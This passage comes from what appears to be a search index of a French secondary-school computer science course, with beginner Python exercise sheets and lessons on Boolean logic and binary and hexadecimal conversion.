   if nombre % i == 0:\n        print(i, \" divise \", nombre)</code></pre> Difficile \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a\ud83e\udd8a Conjecture de Syracuse <p>\u00c9crire un programme qui r\u00e9alise la conjecture de Syracuse pour un nombre demand\u00e9 par l'utilisateur. Tant que le nombre n'est pas 1, s'il est pair, on le divise par 2 sinon on le multiplie par 3 et on ajoute 1.</p> <p>Exemple : 10 \u2192 5 \u2192 16 \u2192 8 \u2192 4 \u2192 2 \u2192 1</p> \ud83d\udd12 Correction non disponible              <pre><code>nombre = int(input(\"Donnez un nombre : \"))\nwhile nombre != 1:\n    print(nombre)\n    if nombre % 2 == 0:\n        nombre = nombre // 2\n    else:\n        nombre = nombre * 3 + 1\nprint(1)</code></pre>"},{"location":"premiere/I-Constructions_elementaires/Fiches_d_exercices/Exercices_fonctions/","title":"Fiche d'exercices : Fonctions","text":"\ud83c\udfaf Exercices d'introduction \ud83c\udf1f Niveau 1 \ud83d\udd25 Niveau 2 \ud83d\ude80 Niveau 3 Introduction \ud83e\udd8a Calcul de l'aire d'un rectangle (affichage) <p>\u00c9crire un programme qui prend deux r\u00e9els <code>longueur</code> et <code>largeur</code> et qui calcule l'aire d'un rectangle en affichant le r\u00e9sultat sous la forme : <code>'L'aire du rectangle est : [aire]'</code>.</p> \ud83d\udd12 Correction non disponible              <pre><code>def aire_rectangle(longueur: float, largeur: float) -&gt; None:\n    print(\"L'aire du rectangle est \", longueur * largeur)</code></pre> Introduction \ud83e\udd8a Calcul de l'aire d'un rectangle (fonction) <p>\u00c9crire une fonction Python <code>aire_rectangle</code> qui prend en param\u00e8tres deux r\u00e9els correspondant \u00e0 la largeur et la longueur d'un rectangle et renvoie l'aire de ce rectangle.</p> \ud83d\udd12 Correction non disponible              <pre><code>def aire_rectangle(longueur: float, largeur: float) -&gt; float:\n    return longueur * largeur</code></pre> Introduction \ud83e\udd8a Calcul de la moyenne <p>\u00c9crire une fonction <code>moyenne</code> qui prend deux r\u00e9els en param\u00e8tres et renvoie la moyenne de ces deux nombres.</p> \ud83d\udd12 Correction non disponible              <pre><code>def moyenne(note_1: float, note_2: float) -&gt; float:\n    return (note_1 + note_2) / 2</code></pre> Introduction \ud83e\udd8a Somme de deux entiers <p>\u00c9crire une fonction <code>somme</code> qui prend deux entiers en param\u00e8tres et renvoie leur somme.</p> <p>Exemple : somme(4,5) doit renvoyer 9.</p> \ud83d\udd12 Correction non disponible              <pre><code>def somme(nombre_1: int, nombre_2: int) -&gt; int:\n    return nombre_1 + nombre_2</code></pre> Introduction \ud83e\udd8a Test de parit\u00e9 <p>\u00c9crire une fonction <code>parite</code> qui prend en param\u00e8tre un entier et renvoie <code>True</code> s'il est pair, <code>False</code> sinon.</p> <p>Exemple : parite(7) doit renvoyer False.</p> \ud83d\udd12 Correction non disponible              <pre><code>def parite(nombre: int) -&gt; bool:\n    return nombre % 2 == 0</code></pre> <p> </p>"},{"location":"premiere/I-Constructions_elementaires/Fiches_d_exercices/Exercices_specification/","title":"Fiche d'exercices : Bonnes pratique de d\u00e9veloppement","text":"En-t\u00eates de fonctions Documentation Nommage de variables En-t\u00eate de fonctions <p>Une en-t\u00eate de fonction permet de sp\u00e9cifier les types de param\u00e8tres en entr\u00e9e et le type du r\u00e9sultat renvoy\u00e9 par la fonction.</p> <p>Elle est constitu\u00e9e ainsi :</p> <pre><code>def nom_de_fonction(parametre_1 : type, parametre_2 : type , ... ) -&gt; type_du_renvoi :</code></pre> <p>Cela permet de se rendre compte du premier coup d'\u0153il de ce que la fonction doit faire.</p> Facile Fonction multiplier <p>\u00c9crire l'en-t\u00eate d'une fonction <code>multiplier</code> qui prend en param\u00e8tre deux nombres entiers et renvoie leur produit.</p> \ud83d\udd12 Correction non disponible <pre><code>def multiplier(a: int, b: int) -&gt; int:</code></pre> Facile Fonction concat\u00e9nation <p>\u00c9crire l'en-t\u00eate d'une fonction <code>concatenation</code> qui prend en param\u00e8tres deux cha\u00eenes de caract\u00e8res et renvoie leur concat\u00e9nation.</p> \ud83d\udd12 Correction non disponible <pre><code>def concatenation(chaine1: str, chaine2: str) -&gt; str:</code></pre> Facile Fonction est_pair <p>\u00c9crire l'en-t\u00eate d'une fonction <code>est_pair</code> qui prend en param\u00e8tre un nombre entier et renvoie True si le nombre est pair, False sinon.</p> \ud83d\udd12 Correction non disponible <pre><code>def est_pair(nombre: int) -&gt; bool:</code></pre> Facile Fonction afficher_somme <p>\u00c9crire l'en-t\u00eate d'une fonction <code>afficher_somme</code> qui prend en param\u00e8tres deux nombres entiers et affiche seulement leur somme.</p> \ud83d\udd12 Correction non disponible <pre><code>def afficher_somme(a: int, b: int) -&gt; None:</code></pre> Facile Fonction aire_rectangle <p>\u00c9crire l'en-t\u00eate d'une fonction <code>aire_rectangle</code> qui prend en param\u00e8tres deux nombres r\u00e9els (float) et renvoie leur produit.</p> \ud83d\udd12 Correction non disponible <pre><code>def aire_rectangle(longueur: float, largeur: float) -&gt; float:</code></pre> Documentation de fonctions <p>La documentation permet \u00e0 un utilisateur qui fait une revue de code de comprendre ce que la fonction r\u00e9alise pour : soit comprendre le code, soit le d\u00e9bugger.</p> <p>Elle est souvent conjointe \u00e0 la d\u00e9finition d'en-t\u00eate mais peut la remplacer.</p> <p>La documentation est primordiale lors d'un travail en projet ou en entreprise. Cela permet aussi de savoir revenir sur un projet apr\u00e8s ne pas y avoir travaill\u00e9 apr\u00e8s une certaine dur\u00e9e.</p> <p>Enfin, cette documentation permet aussi de g\u00e9n\u00e9rer de la documentation automatiquement, souvent utilis\u00e9 en projets.</p> <p>Elle est souvent de la forme :</p> <pre><code>def nom_de_fonction(parametre_1, parametre_2):\n    '''\n    Param\u00e8tres : \n        parametre_1 : type du param\u00e8tre\n        parametre_2 : type du param\u00e8tre\n    Retourne : \n        type de la sortie\n    Explication courte de ce que fait la fonction\n    '''</code></pre> Interm\u00e9diaire Documentation des fonctions <p>\u00c9crire la sp\u00e9cification des fonctions suivantes :</p> <pre><code>def est_voyelle(lettre):\n    if lettre == 'a' or lettre == 'e' or lettre == 'o' or lettre == 'i' or lettre == 'y':\n        return True\n    else :\n        return False\n\ndef mots(phrase):\n    compteur = 0\n    for caractere in phrase:\n        if caractere == ' ':\n            compteur = compteur + 1\n    return compteur\n\ndef surface(rayon):\n    pi = 3.14159\n    aire = pi * rayon ** 2\n    return aire</code></pre> \ud83d\udd12 Correction non disponible <pre><code>def est_voyelle(lettre):\n    '''\n    Param\u00e8tres :\n        lettre (str) : Un caract\u00e8re \u00e0 tester\n    Retourne :\n        bool : True si la lettre est une voyelle, False sinon\n    D\u00e9termine si un caract\u00e8re est une voyelle\n    '''\n    if lettre == 'a' or lettre == 'e' or lettre == 'o' or lettre == 'i' or lettre == 'y':\n        return True\n    else :\n        return False\n\ndef mots(phrase):\n    '''\n    Param\u00e8tres :\n        phrase (str) : Une phrase \u00e0 analyser\n    Retourne :\n        int : Le nombre d'espaces dans la phrase\n    Compte le nombre d'espaces dans une phrase\n    '''\n    compteur = 0\n    for caractere in phrase:\n        if caractere == ' ':\n            compteur = compteur + 1\n    return compteur\n\ndef surface(rayon):\n    '''\n    Param\u00e8tres :\n        rayon (float) : Le rayon du cercle\n    Retourne :\n        float : La surface du cercle\n    Calcule la surface d'un cercle \u00e0 partir de son rayon\n    '''\n    pi = 3.14159\n    aire = pi * rayon ** 2\n    return aire</code></pre> Nommage de variables <p>Un code peut \u00eatre document\u00e9 correctement mais si les variables et le nom de fonction ne sont pas compr\u00e9hensibles, cela peut impacter n\u00e9gativement la compr\u00e9hension du code.</p> <p>Renommer les variables et les fonctions des diff\u00e9rents algorithmes pour les rendre plus compr\u00e9hensibles.</p> Interm\u00e9diaire Am\u00e9lioration du nommage <p>Renommer les variables et fonctions pour am\u00e9liorer la lisibilit\u00e9 :</p> <pre><code>def f(l):\n    \"\"\"\n    Calcule la somme des \u00e9l\u00e9ments d'une liste de nombres.\n    Param\u00e8tres :\n        l (list) : Liste contenant des nombres.\n    Retourne :\n        int : La somme des \u00e9l\u00e9ments de la liste.\n    \"\"\"\n    s = 0\n    for i in l:\n        s += i\n    return s\n\ndef m(a, b):\n    \"\"\"\n    Calcule la moyenne de deux nombres.\n    Param\u00e8tres :\n        a (int/float) : Le premier nombre.\n        b (int/float) : Le deuxi\u00e8me nombre.\n    Retourne :\n        float : La moyenne des deux nombres.\n    \"\"\"\n    return (a + b) / 2\n\ndef p(l, L):\n    \"\"\"\n    Calcule le p\u00e9rim\u00e8tre d'un rectangle.\n    Param\u00e8tres :\n        l (float) : La longueur du rectangle.\n        L (float) : La largeur du rectangle.\n    Retourne :\n        float : Le p\u00e9rim\u00e8tre du rectangle.\n    \"\"\"\n    return 2 * (l + L)</code></pre> \ud83d\udd12 Correction non disponible <pre><code>def calculer_somme_liste(liste_nombres):\n    \"\"\"\n    Calcule la somme des \u00e9l\u00e9ments d'une liste de nombres.\n    Param\u00e8tres :\n        liste_nombres (list) : Liste contenant des nombres.\n    Retourne :\n        int : La somme des \u00e9l\u00e9ments de la liste.\n    \"\"\"\n    somme = 0\n    for nombre in liste_nombres:\n        somme += nombre\n    return somme\n\ndef calculer_moyenne(premier_nombre, deuxieme_nombre):\n    \"\"\"\n    Calcule la moyenne de deux nombres.\n    Param\u00e8tres :\n        premier_nombre (int/float) : Le premier nombre.\n        deuxieme_nombre (int/float) : Le deuxi\u00e8me nombre.\n    Retourne :\n        float : La moyenne des deux nombres.\n    \"\"\"\n    return (premier_nombre + deuxieme_nombre) / 2\n\ndef calculer_perimetre_rectangle(longueur, largeur):\n    \"\"\"\n    Calcule le p\u00e9rim\u00e8tre d'un rectangle.\n    Param\u00e8tres :\n        longueur (float) : La longueur du rectangle.\n        largeur (float) : La largeur du rectangle.\n    Retourne :\n        float : Le p\u00e9rim\u00e8tre du rectangle.\n    \"\"\"\n    return 2 * (longueur + largeur)</code></pre>"},{"location":"premiere/I-Constructions_elementaires/Fiches_d_exercices/Fiche_exercice/","title":"Fiche d'exercices : Types en python","text":"\ud83c\udfaf Exercices d'introduction \ud83c\udf1f Niveau Facile \ud83d\udd25 Niveau Interm\u00e9diaire \ud83d\ude80 Niveau Difficile Introduction \ud83e\udd8a Types en Python <p>Donner les types des valeurs suivantes : <code>13</code>, <code>14.5</code>, <code>'Hello World!'</code>, <code>True</code>, <code>'15.5'</code></p> Introduction \ud83e\udd8a Table de v\u00e9rit\u00e9 XOR <p>\u00c0 l'aide de python, \u00e9crire un programme qui affiche dans le terminal la table de v\u00e9rit\u00e9 de la fonction bool\u00e9enne <code>xor</code>.</p> \ud83d\udd12 Correction non disponible              <pre><code>print('Table de v\u00e9rit\u00e9 du XOR')\nprint('a','b','s')\nprint(0,0,0)\nprint(0,1,1)\nprint(1,0,1)\nprint(1,1,0)</code></pre> Introduction \ud83e\udd8a Somme de deux nombres <p>\u00c9crire un programme qui permet d'afficher la somme de deux nombres entiers de la forme 'La somme est x+y' avec x et y d\u00e9fini pr\u00e9c\u00e9demment.</p> \ud83d\udd12 Correction non disponible              <pre><code>x = 4\ny = 3\nprint('La somme est', x+y)</code></pre> Introduction \ud83e\udd8a Affichage am\u00e9lior\u00e9 <p>Am\u00e9liorer le programme pr\u00e9c\u00e9dent pour qu'il affiche 'La somme de x et y est x+y'.</p> \ud83d\udd12 Correction non disponible              <pre><code>x = 4\ny = 3\nprint('La somme de',x, ' et ', y, ' est ', x+y)</code></pre> Introduction \ud83e\udd8a Concat\u00e9nation de cha\u00eenes <p>\u00c9crire un programme qui instancie deux cha\u00eenes de caract\u00e8res, les concat\u00e8ne et affiche le r\u00e9sultat sous la forme <code>'La cha\u00eene r\u00e9sultante est : [r\u00e9sultat]'</code>.</p> \ud83d\udd12 Correction non disponible              <pre><code>chaine_a = \"Bonjour\"\nchaine_b = \"Au Revoir\"\nprint(\"La cha\u00eene r\u00e9sultante est :\", chaine_a+chaine_b)</code></pre> Introduction \ud83e\udd8a \u00c9tude de code <p>\u00c9valuer les valeurs de result \u00e0 la fin de chaque programme.</p> <pre><code>x = 8\ny = 6\nif x &gt; y:\n    result = x - y\nelse:\n    result = y - x</code></pre> <pre><code>a = 4\nb = 9\nif a &lt; b:\n    result = a + b\nelse:\n    result = a * b</code></pre> <pre><code>m = 7\nn = 3\nif m % 2 == 0:\n    result = m * n\nelse:\n    result = m + n</code></pre> <p>\u00c0 l'aide de python, \u00e9valuer les r\u00e9sultats de ces comparaisons avec x = 5, x = 10 et x = -20</p> <ol> <li>x &lt; 20 and x &gt; - 20</li> <li>x &gt; 5 or x &lt; 3</li> <li><code>not (x == 10)</code></li> <li><code>x &gt;= 0 and x &lt;= 10</code></li> <li><code>x % 2 == 0 or x % 3 == 0</code></li> <li><code>x &lt; 0 or (x &gt; 0 and x % 2 != 0)</code></li> </ol> Introduction \ud83e\udd8a Parit\u00e9 d'un nombre <p>\u00c9crire un programme qui affiche dans le terminal si un nombre est pair ou impair.</p> \ud83d\udd12 Correction non disponible              <pre><code>a = int(input(\"Entrez un nombre\"))\nif a % 2 == 0:  # Si le reste de la division de a par 2 est 0 -&gt; Si 2 divise a\n    print(\"pair\")\nelse:\n    print(\"impair\")</code></pre> Facile \ud83e\udd8a\ud83e\udd8a Maximum entre trois nombres <p>\u00c9crire un programme qui permet de trouver la valeur maximale entre trois variables enti\u00e8res. Ce programme affichera dans la console : \"Le nombre <code>x</code> est plus grand que <code>y</code> et <code>z</code>.</p> \ud83d\udd12 Correction non disponible              <pre><code>val_1 = int(input(\"Valeur 1\"))\nval_2 = int(input(\"Valeur 2\"))\nval_3 = int(input(\"Valeur 3\"))\nif val_1 &gt; val_2 and val_1 &gt; val_3:\n    print(val_1, \" est la plus grande\")\nelif val_2 &gt; val_1 and val_2 &gt; val_3:\n    print(val_2, \" est la plus grande\")\nelif val_3 &gt; val_1 and val_3 &gt; val_2:\n    print(val_3, \" est la plus grande\")</code></pre> Facile \ud83e\udd8a\ud83e\udd8a Calculatrice basique <p>\u00c9crire un programme qui est une calculatrice basique. Elle demandera \u00e0 l'utilisateur 2 nombres entiers <code>a</code> et <code>b</code> et un op\u00e9rateur (<code>+</code>,<code>-</code>,<code>*</code>,<code>/</code>). Ce programme affichera : L'op\u00e9ration <code>a</code> <code>operateur</code> <code>b</code> vaut ...</p> \ud83d\udd12 Correction non disponible              <pre><code>a = int(input(\"Entrez un premier nombre\"))\nb = int(input(\"Entrez un second nombre\"))\noperateur = input(\"Entrez un op\u00e9rateur : + - / *\")\nif operateur == \"+\":\n    print(a+b)\nelif operateur == \"-\":\n    print(a-b)\nelif operateur == \"*\":\n    print(a*b)\nelif operateur == \"/\":\n    # On ne peut pas diviser par z\u00e9ro\n    if b != 0:\n        print(a/b)</code></pre> Facile \ud83e\udd8a\ud83e\udd8a Profit ou perte <p>\u00c9crire un programme qui \u00e9tant donn\u00e9 deux valeurs cout_de_production et prix_de_vente, affiche dans le terminal <code>profit</code> si le cout est inf\u00e9rieur au prix de vente, <code>perte</code> sinon.</p> \ud83d\udd12 Correction non disponible              <pre><code>prix_de_vente = int(input(\"Entrez un prix de vente\"))\ncout_de_production = int(input(\"Entrez un co\u00fbt de production\"))\n\nif prix_de_vente &gt; cout_de_production:\n    print(\"profit\")\nelif prix_de_vente == cout_de_production:\n    print(\"pas de marge\")\nelse:\n    print(\"perte\")</code></pre> Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a Mentions au baccalaur\u00e9at <p>\u00c9crire un programme qui prend une note sur 20 et affiche dans le terminal si l'\u00e9tudiant a obtenu une mention :</p> <ul> <li><code>'Tr\u00e8s bien'</code> pour une note sup\u00e9rieure ou \u00e9gale \u00e0 16.</li> <li><code>'Bien'</code> pour une note entre 14 et 15.</li> <li><code>'Assez bien'</code> pour une note entre 12 et 13.</li> <li><code>'Passable'</code> pour une note entre 10 et 11.</li> <li><code>'\u00c9chec'</code> pour une note inf\u00e9rieure \u00e0 10.</li> </ul> \ud83d\udd12 Correction non disponible              <pre><code># Demander \u00e0 l'utilisateur de saisir une note\nnote = float(input(\"Entrez une note sur 20 : \"))\n\n# V\u00e9rifier la mention correspondante et afficher le r\u00e9sultat\nif note &gt;= 16:\n    print(\"Mention : Tr\u00e8s bien\")\nelif 14 &lt;= note &lt;= 15:\n    print(\"Mention : Bien\")\nelif 12 &lt;= note &lt;= 13:\n    print(\"Mention : Assez bien\")\nelif 10 &lt;= note &lt;= 11:\n    print(\"Mention : Passable\")\nelse:\n    print(\"Mention : \u00c9chec\")</code></pre> <p>Aucun exercice difficile pour cette fiche.</p>"},{"location":"premiere/II-Representation_des_donnees/Cours/c_1_booleen_et_operations/","title":"C 1 booleen et operations","text":"\ud83d\udd22 Bool\u00e9ens et Fonctions bool\u00e9ennes <p>L'alg\u00e8bre de George Boole et la logique binaire</p> \ud83c\udfaf D\u00e9finitions Fondamentales <p>Variable bool\u00e9enne : Une variable qui peut prendre deux \u00e9tats : Vrai ou Faux. Ces \u00e9tats peuvent \u00eatre \u00e9quivalents \u00e0 des valeurs num\u00e9riques : Vrai = 1 et Faux = 0.</p> <p>Fonction bool\u00e9enne : Une fonction qui prend en param\u00e8tre des variables bool\u00e9ennes et en ressort un r\u00e9sultat.</p> <p>\u00c9quation bool\u00e9enne : Un ensemble de fonctions bool\u00e9enne prenant en param\u00e8tre un certain nombre de variables et renvoie un r\u00e9sultat en sortie.</p>      \u26a1 En machine : Ces \u00e9tats correspondent \u00e0 la pr\u00e9sence du courant ou non.  \ud83d\udd27 Fonctions bool\u00e9ennes \ud83d\udcda Concept des Tables de V\u00e9rit\u00e9          Il existe un certain nombre d'op\u00e9rations bool\u00e9ennes. Ces fonctions donnent un r\u00e9sultat fini d\u00e9pendant de l'\u00e9tat des variables en param\u00e8tre. On appelle cet ensemble de couples \u00e9tats/r\u00e9sultat une table de v\u00e9rit\u00e9.      \ud83d\udeab Fonction NOT (NON)              La fonction NOT prend en param\u00e8tre une variable bool\u00e9enne et renvoie son oppos\u00e9.          a s 0 1 1 0 \ud83e\udd1d Fonction AND (ET)              La fonction AND prend en param\u00e8tre deux variables bool\u00e9ennes et renvoie en sortie si les deux variables sont \u00e0 l'\u00e9tat 1. L'op\u00e9rateur est $\\times$ ou $\\cdot$.          a b s 0 0 0 0 1 0 1 0 0 1 1 1 \ud83d\udd00 Fonction OR (OU)              La fonction OR prend en param\u00e8tre deux variables et renvoie 1 si l'une ou les deux variables bool\u00e9ennes sont \u00e0 l'\u00e9tat 1. L'op\u00e9rateur est $+$.          a b s 0 0 0 0 1 1 1 0 1 1 1 1 \u26a1 Fonction XOR (OU Exclusif)              La fonction XOR correspond \u00e0 une fonction bool\u00e9enne OR mais qui renvoie 1 uniquement si un des deux param\u00e8tre est \u00e0 l'\u00e9tat 1.          a b s 0 0 0 0 1 1 1 0 1 1 1 0 \ud83e\uddee \u00c9quations bool\u00e9ennes \ud83d\udcd6 L'Alg\u00e8bre de George Boole          Une \u00e9quation bool\u00e9enne est un ensemble de fonctions bool\u00e9ennes. Ces fonctions r\u00e9pondent \u00e0 l'alg\u00e8bre bool\u00e9enne cr\u00e9\u00e9e par George Boole \u00e0 la fin du XIX\u00e8me si\u00e8cle.           \ud83d\udcd0 Priorit\u00e9s op\u00e9ratoires : Les \u00e9quations bool\u00e9ennes se lisent de gauche \u00e0 droite et d\u00e9pendent des priorit\u00e9s op\u00e9ratoires PEMDAS comme en math\u00e9matiques.  \ud83d\udd0d Exemple d'\u00c9valuation <p>\u00c9quation : $S = (a + b) \\times c$ se lit \"a ou b et c\".</p> <p>Avec : a = 1, b = 0 et c = 0</p> <p>\u00c9valuation :</p> <ol> <li>On \u00e9value d'abord l'op\u00e9ration OU : $(1+0) = 1$</li> <li>Puis l'op\u00e9ration ET : $1 \\times 0 = 0$</li> <li>R\u00e9sultat : $S = 0$</li> </ol> \ud83d\udc0d Impl\u00e9mentation en Python \ud83d\udcbb Op\u00e9rateurs Python          Sur Python, on peut \u00e9valuer des \u00e9quations bool\u00e9ennes avec des op\u00e9rateurs transparents et des valeurs True (Vrai) et False (Faux).      or Fonction OU \u00c9quivalent de + and Fonction ET \u00c9quivalent de \u00d7 not Fonction NON N\u00e9gation logique \ud83d\udcbb Exemple Pratique en Python <pre><code>a = True\nb = False\nc = False\n\n# \u00c9valuation de l'\u00e9quation S = (a or b) and c\nS = (a or b) and c\nprint(f\"R\u00e9sultat : {S}\")  # Affiche : False\n\n# D\u00e9tail de l'\u00e9valuation\nprint(f\"a or b = {a or b}\")     # True\nprint(f\"(a or b) and c = {S}\")  # False</code></pre>      \ud83c\udfaf Correspondance : True = 1 (Vrai) et False = 0 (Faux) - Python g\u00e8re automatiquement la conversion entre les valeurs bool\u00e9ennes et num\u00e9riques."},{"location":"premiere/II-Representation_des_donnees/Cours/c_2_entier_binaire_hexa/","title":"C 2 entier binaire hexa","text":"\ud83d\udd22 Entiers Positifs en Binaire et Hexad\u00e9cimal <p>Comprendre les syst\u00e8mes de num\u00e9ration et les conversions entre bases</p> \ud83d\udcca Rappel : Les bases dans la vie courante \ud83c\udfaf Syst\u00e8me de notation en colonnes              Notre syst\u00e8me de notation repose sur une disposition en colonnes. Nous comptons avec 10 symboles allant de 0 \u00e0 9 que l'on nomme chiffre. Une fois que nous avons atteint le chiffre 9, si l'on souhaite rajouter 1, on se rend compte que l'on n'a pas de chiffres sup\u00e9rieurs. On cr\u00e9e ainsi une colonne \u00e0 gauche qui contiendra un chiffre allant de 1 \u00e0 9 en remettant le chiffre de la colonne originelle (ou les suivantes) \u00e0 0.                   \ud83d\udca1 Exemple : 426 est compos\u00e9 des chiffres 4, 2 et 6 repr\u00e9sent\u00e9s dans les colonnes des centaines, dizaines et unit\u00e9s.               Notre quotidien est entour\u00e9 de nombres, que ce soit pour les heures qui passent, les notes, le nombre d'\u0153ufs dans une bo\u00eete. Ils sont partout et font partie de nos vies sans m\u00eame que l'on s'en rende compte. Mais il existe une quasi infinit\u00e9 de bases !      \ud83e\udd5a Base 12 - Douzaines                  Les bo\u00eetes d'\u0153ufs sont en base 12, issue du fait qu'historiquement nous suivons le compte des \u0153ufs avec le nombre de phalanges que l'on a sur une main (sans compter le pouce car celui-ci pointe les phalanges pour compter).              \u23f0 Base 60 - Temps                  Les heures sont divis\u00e9es en base 60. Il \u00e9tait plus simple de diviser les heures en 60 minutes pour calculer les dur\u00e9es plus facilement. Cela provient des babyloniens qui comptaient dans un syst\u00e8me sexag\u00e9simal.              \ud83d\udcfa Base 4 - Les Shadoks                  Les personnages de ce dessin anim\u00e9 comptent avec 4 chiffres pour \u00e9crire leurs nombres : GA, BU, ZO, MEU. Un syst\u00e8me de num\u00e9ration cr\u00e9atif et amusant !              \ud83c\udfb5 Base 16 - Bibi-binaire                  Syst\u00e8me con\u00e7u par le compositeur Boby Lapointe en 1968. Il utilise des consonnes et des voyelles : H, B, K, D et A, E, O, I. L'avantage : on peut chanter les nombres !              \ud83d\udcbb Base 8 - Octal                  Base contenant 8 symboles allant de 0 \u00e0 7. Cette base servait aux informaticiens qui d\u00e9veloppaient en langage machine pour r\u00e9duire le nombre de bits \u00e0 \u00e9crire.                 $B_{8} = \\{0,1,2,3,4,5,6,7\\}$              \ud83d\udcda D\u00e9finitions Fondamentales \ud83c\udfaf Qu'est-ce qu'une base ?              Une base correspond au nombre de symboles qui permettent de repr\u00e9senter les chiffres ou les nombres.                   \ud83d\udca1 Base d\u00e9cimale : $B_{10} = \\{0,1,2,...,9\\}$      \u26a1 Pourquoi le Binaire ?                  En informatique, il a \u00e9t\u00e9 d\u00e9cid\u00e9 d'utiliser le binaire car une machine peut facilement d\u00e9tecter la diff\u00e9rence entre deux \u00e9tats. Un processeur est compos\u00e9 de transistors qui traitent deux \u00e9tats : ouverts et ferm\u00e9s \u00e0 la mani\u00e8re d'un interrupteur.              \ud83d\udd22 Base Binaire                  Le binaire, ou repr\u00e9sentation en base 2, est un moyen de repr\u00e9senter les nombres avec 2 symboles : 0 ou 1.                 $B_{2} = \\{0,1\\}$              \ud83d\udcca Bits et Octets                  On nomme bit les chiffres de la repr\u00e9sentation en base 2 et un ensemble de 8 bits est appel\u00e9 un byte ou octet.                       \ud83e\udd14 Question de r\u00e9flexion : Combien de nombres peut-on repr\u00e9senter avec n bits ? \ud83d\udd04 Compter en Base 2 \ud83c\udfaf Principe du comptage binaire              Pour compter en base 2, on op\u00e8re de la m\u00eame mani\u00e8re qu'en base 10. On a une colonne qui peut valoir 0 ou 1. Une fois que la colonne atteint 1, on rajoute une colonne \u00e0 sa gauche \u00e0 1 et l'on passe la colonne de droite \u00e0 0.          \ud83d\udd22 Comment passer de base 2 \u00e0 base 10 ? \ud83d\udcdd Rappel : Compter en base 10              $154_{(10)} = 1\\times10^{2} + 5\\times10^{1} + 4\\times10^{0}$          \ud83d\udcbb Exemple de conversion binaire \u2192 d\u00e9cimal <pre><code>$1101_{(2)} = 1\\times2^{3} + 1\\times2^{2} + 0\\times2^{1} + 1\\times2^{0}$\n$1101_{(2)} = 8 + 4 + 0 + 1 = 13_{(10)}$</code></pre>          \u26a0\ufe0f Important : \u00c0 partir de maintenant, pour \u00e9crire un nombre si la base n'est pas explicite, il faut la pr\u00e9ciser :         <ul> <li>$154_{(10)}$ avec la base \u00e9crite sous le nombre en parenth\u00e8ses</li> <li>$\\overline{154}^{(10)}$ avec le nombre surlign\u00e9 et la base indiqu\u00e9e entre parenth\u00e8ses</li> </ul> \u270f\ufe0f Exercice : Convertir de binaire en d\u00e9cimal <ul> <li>$1101_{(2)}$</li> <li>$1001_{(2)}$</li> <li>$1010_{(2)}$</li> <li>$1111_{(2)}$</li> </ul> \ud83d\udd04 Comment passer de base 10 \u00e0 base 2 \u2797 M\u00e9thode des divisions successives                  Pour passer de la base 10 \u00e0 la base 2, on peut utiliser la m\u00e9thode des divisions successives. De la m\u00eame mani\u00e8re que l'on \u00e9crit en addition de puissances de bases, on peut r\u00e9aliser l'op\u00e9ration inverse pour trouver la repr\u00e9sentation binaire.              \ud83d\udcbb Exemple : Convertir 29 en binaire <pre><code>29| 2\n  |---\n1 | 14 | 2\n       |---\n     0 | 7 | 2\n           |---\n         1 | 3 | 2\n               |---\n             1 | 1 | 2\n                   |---\n                 1 | 0</code></pre>                  On divise successivement le nombre \u00e0 convertir par 2. Chaque reste correspond au nombre dans la repr\u00e9sentation et chaque quotient est \u00e0 diviser \u00e0 la suite par 2. On r\u00e9p\u00e8te ces op\u00e9rations jusqu'\u00e0 ce que le quotient soit 0 et le reste 1.                               \ud83d\udcca R\u00e9sultat : $29_{10} = 11101_{2}$                 V\u00e9rification : $11101_{2} = 1\u00d72^{4} + 1\u00d72^{3} + 1\u00d72^{2} + 0\u00d72^{1} + 1\u00d72^{0} = 16 + 8 + 4 + 0 + 1 = 29_{10}$              \u270f\ufe0f Exercice : Convertir de d\u00e9cimal en binaire <ul> <li>$27_{10}$</li> <li>$14_{10}$</li> <li>$42_{10}$</li> <li>$33_{10}$</li> </ul> \u2796 M\u00e9thode des soustractions successives                  Une autre m\u00e9thode utilisable est la m\u00e9thode des soustractions successives. Pour ce faire, il suffit de se munir d'un tableau de puissances de 2 et de savoir calculer toutes les puissances de 2.              \ud83d\udcca Tableau des puissances de 2 $2^{n}$ $2^{n-1}$ $2^{n-2}$ ... $2^{2}$ $2^{1}$ $2^{0}$ \ud83d\udcbb Exemple : Convertir 42 en binaire <pre><code>On choisit 64 &gt; 42 donc on aura un tableau de 7 cases.\nEst-ce que 42 \u2265 64 ? Non, on met 0 dans la case du tableau.\nEst-ce que 42 \u2265 32 ? Oui, on met 1 dans la case du tableau. \nReste : 42 - 32 = 10\nEst-ce que 10 \u2265 16 ? Non, on met 0 dans le tableau.\nEst-ce que 10 \u2265 8 ? Oui, on met 1 dans le tableau.\nReste : 10 - 8 = 2\nEt ainsi de suite...</code></pre> $2^{6} = 64$ $2^{5} = 32$ $2^{4} = 16$ $2^{3} = 8$ $2^{2} = 4$ $2^{1} = 2$ $2^{0} = 1$ 0 1 0 1 0 1 0                  \ud83d\udcca R\u00e9sultat : $42_{10} = 101010_{2}$                 V\u00e9rification : $2^{5} + 2^{3} + 2^{1} = 32 + 8 + 2 = 42$              \ud83d\udd22 Hexad\u00e9cimal \ud83d\udcd6 D\u00e9finition              En informatique, une autre base tr\u00e8s importante est la base hexad\u00e9cimale (ou hex). Cette base repr\u00e9sente les nombres avec 16 symboles.                          Cette base est tr\u00e8s utile pour divers usages notamment :             <ul> <li>La repr\u00e9sentation d'adresse m\u00e9moire</li> <li>La repr\u00e9sentation des couleurs</li> </ul>              On peut noter cette base : $B_{16} = \\{0,1,2,3,4,5,6,7,8,9,A,B,C,D,E,F\\}$          \ud83d\udcca Table de correspondance D\u00e9cimal \u2194 Hexad\u00e9cimal D\u00e9cimal Hexad\u00e9cimal D\u00e9cimal Hexad\u00e9cimal 0088 1199 2210A 3311B 4412C 5513D 6614E 7715F          \ud83d\udca1 Important : On repr\u00e9sente chaque symbole de la repr\u00e9sentation en base hexad\u00e9cimale par un ensemble de 4 bits.      \ud83d\udd04 Convertir en base hexad\u00e9cimale \u2797 M\u00e9thode des divisions successives                  \u00c0 l'instar de la base 2 (et de toutes les bases), pour convertir on peut utiliser la m\u00e9thode des divisions successives comme d\u00e9velopp\u00e9 pour la partie binaire mais en divisant successivement par 16.              \ud83d\udcbb Exemple : Convertir 255 en hexad\u00e9cimal <pre><code>255 \u00f7 16 = 15 reste 15 (F)\n 15 \u00f7 16 = 0  reste 15 (F)\n\nR\u00e9sultat : 255\u2081\u2080 = FF\u2081\u2086</code></pre> \ud83d\udd04 Passer par la base 2                  Une autre m\u00e9thode serait de convertir le nombre que nous avons en base 10 en binaire.                 Ainsi, on 